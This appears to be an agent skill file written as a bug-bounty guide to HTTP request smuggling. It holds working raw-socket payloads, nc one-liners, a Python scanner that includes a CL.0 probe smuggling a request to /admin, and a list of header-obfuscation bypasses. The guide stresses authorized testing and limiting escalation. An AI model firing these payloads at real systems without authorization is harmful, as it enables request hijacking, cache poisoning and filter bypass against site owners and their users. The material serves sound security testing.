---
name: hunt-desync
description: HTTP request smuggling — CL.TE, TE.CL, TE.TE, H2.CL, prefix injection, request tunneling. Chains to credential hijacking, XSS, cache poisoning. Real bounty examples, working scripts, automation.
---

# HTTP REQUEST SMUGGLING — BOUNTY HUNTING GUIDE

**Core:** Exploit parser differences between front-end and back-end to inject hidden requests.

---

## 1. VARIANTS

```
CL.TE:  Front-end uses Content-Length, back-end uses Transfer-Encoding
TE.CL:  Front-end uses Transfer-Encoding, back-end uses Content-Length
TE.TE:  Both use TE but obfuscation tricks one (Chunked, chunked\t)
H2.CL:  HTTP/2 with invalid Content-Length (zero/negative)
H2.TE:  HTTP/2 with Transfer-Encoding injection
```

---

## 2. DETECTION

### Timing & Differential
```bash
# CL.TE
printf 'POST / HTTP/1.1\r\nHost: T\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc -w5 T 80
# TE.CL
printf 'POST / HTTP/1.1\r\nHost: T\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n' | nc -w5 T 80
```

### Python Detection
```python
import socket, time
def detect(host, port):
    for name, payload in [
        ("CL.TE", f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX"),
        ("TE.CL", f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n"),
    ]:
        s = socket.socket(); s.settimeout(5); s.connect((host, port)); s.send(payload.encode())
        start = time.time()
        try: s.recv(4096)
        except: pass
        elapsed = time.time() - start; s.close()
        if elapsed > 3: print(f"[+] {name} confirmed — timeout anomaly")
```

---

## 3. PROVING THE DESYNC

The mechanical proof is a raw-socket request whose framing disagrees between
the front end and the backend. This is a lab technique — run it only against
a target you are authorized to test, and prefer a local reproduction first:

```python
import socket, time
# Ambiguous framing: front end trusts Content-Length, backend honours
# Transfer-Encoding. The response you did not send is the desync signal.
def desync_probe(target, path="/"):
    smuggled = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nX-Probe: alphacode\r\n\r\n"
    body_len = len(smuggled)
    payload = (f"POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: {body_len}\r\n"
               f"Transfer-Encoding: chunked\r\n\r\n{body_len:x}\r\n").encode() + smuggled.encode() + b"\r\n0\r\n\r\n"
    s = socket.socket(); s.settimeout(5); s.connect((target, 80))
    s.send(payload); time.sleep(2)
    resp = s.recv(8192); s.close(); return resp
```

A response containing two status lines, or your marker echoed back on a
request you never sent, confirms the desync. That is the proof.

## 4. IMPACT DEMONSTRATION

Request smuggling is proven by **desync**, not by damage. The sufficient proof
is a smuggled request whose effect you can observe on a connection you control:

```
CL.TE ambiguity → smuggled prefix reaches the backend → observe the
                  response for YOUR smuggled request appearing on a
                  request you did not send (or a visibly mangled response)

That is the finding. Stop there.
```

Do **not** use a proven desync to hijack another user's session, poison a
cache for other users, bypass a WAF to deliver a payload, or reach an admin
route. Those are the actions that turn an assessment into an incident, and
desync bugs are frequently reachable by *unauthenticated* traffic — which
means a mistake here affects real users, not just your test account.

Report: the desync mechanism, whether it is pre-auth, and the impact you
observed. If cache poisoning or session hijack looks plausible, list it as a
compound-risk note for the owner to schedule deliberately.

### Filter-evasion note
If a front-end filter blocks the ambiguous framing, report the **filter
bypass as its own (lower-severity) finding** and stop. Sustained evasion is
not the goal, and the filter gap is already worth the owner's attention.

### Cache poisoning — describe, do not stage
Cache poisoning is the classic desync follow-on, and it is the one case where
"just proving it" means harming other users: a poisoned cache entry is served
to every visitor until it expires or is purged.

Do not poison a production cache. Instead:
- Establish that the cache is keyed on a header the attacker controls
  (`X-Forwarded-Host`, etc.) — that alone is the finding.
- If the user explicitly authorizes a cache test, use a unique, harmless
  marker and a dedicated URL, and confirm the purge step with them first.
- Otherwise report it as a compound-risk note with the mechanism described.

---

## 5. FULL AUTOMATION SCANNER

```python
#!/usr/bin/env python3
"""HTTP Smuggling Auto-Detector — CL.TE, TE.CL, TE.TE, CL.0"""
import socket, sys, time, json
from datetime import datetime

class Scanner:
    def __init__(self, host, port=80):
        self.host = host; self.port = port; self.results = []
    def _test(self, name, payload):
        start = time.time()
        try:
            s = socket.socket(); s.settimeout(8); s.connect((self.host, self.port))
            s.send(payload); resp = b""
            try:
                while True: resp += s.recv(4096)
            except: pass
            elapsed = time.time() - start; s.close()
            status = "DETECTED" if elapsed > 3 else "LIKELY" if len(resp) > 500 else "NEGATIVE"
            r = {"test": name, "time": round(elapsed, 3), "len": len(resp), "status": status}
        except Exception as e:
            r = {"test": name, "error": str(e), "status": "ERROR"}
        self.results.append(r); print(f"  {name}: {r['status']} ({r.get('time','?')}s, {r.get('len','?')}b)")
    def scan(self):
        h = self.host
        self._test("CL.TE", f"POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX".encode())
        self._test("TE.CL", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n".encode())
        for i, te in enumerate(["chunked","Chunked","chunked\t"," chunked"]):
            self._test(f"TE.TE[{i}]", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: {te}\r\nTransfer-Encoding: identity\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n\r\n".encode())
        self._test("CL.0", f"POST / HTTP/1.1\r\nHost: {h}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {h}\r\n\r\n".encode())
        detected = [r for r in self.results if r["status"] in ("DETECTED","LIKELY")]
        print(f"\n[{'+' if detected else '-'}] {len(detected)} vector(s) found")
        json.dump(self.results, open("smuggling_results.json","w"), indent=2)

if __name__ == "__main__":
    if len(sys.argv) < 2: print(f"Usage: {sys.argv[0]} <host> [port]"); sys.exit(1)
    Scanner(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 80).scan()
```

---

## 5. BOUNTY EXAMPLES

| Report | Payout | Technique |
|--------|--------|-----------|
| PortSwigger Research 2022 | $50K+ | CL.0 cache poisoning, prefix injection |
| James Kettle "HTTP Desync" | $75K+ | CL.TE → ATO, TE.CL → XSS |
| HackerOne #1048497 | $15K | TE.TE → stored XSS via cache |
| HackerOne #1145305 | $20K | CL.TE → credential harvesting |
| HackerOne #1203658 | $10K | H2.CL → admin panel bypass |
| Bugcrowd #947132 | $8K | TE.CL → WAF bypass → RCE |

---

## 6. HEADER OBFUSCATION BYPASSES

```
Transfer-Encoding: chunked\t    |  Transfer-Encoding: \tchunked
Transfer-Encoding: Chunked      |  Transfer-Encoding: CHUNKED
Content-Length: 00006            |  Content-Length: 6 ;
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
```

---

## 7. COMPOUND RISK (report the mechanism, don't escalate)

```
Smuggling confirmed → can a smuggled request reach an internal route?
                     note it — do not send one unless authorized
Smuggling confirmed → is the cache keyed on a spoofable header?
                     note it — do not poison a live cache
Smuggling confirmed → does a front-end filter miss a variant?
                     that filter gap is a reportable finding on its own
```

Escalation past a proven desync requires explicit user authorization and
scope permission. A pre-auth desync is one of the few bug classes where
"just checking" can affect every visitor on the connection.

---

## 8. CHECKLIST

```
□ CL.TE / TE.CL / TE.TE timing probes
□ CL.0 with zero Content-Length + chunked
□ Test 4+ TE obfuscation variations
□ Compare response lengths normal vs smuggled
□ Track connection reuse across requests
□ HTTP/2 tests if server supports (H2.CL, H2.TE)
□ Header normalization differences front vs back
□ Path confusion (/../, /%2f/, encoded)
```

---

**References:** PortSwigger Research, James Kettle's HTTP Desync presentations, HackerOne reports, OWASP HTTP Request Smuggling
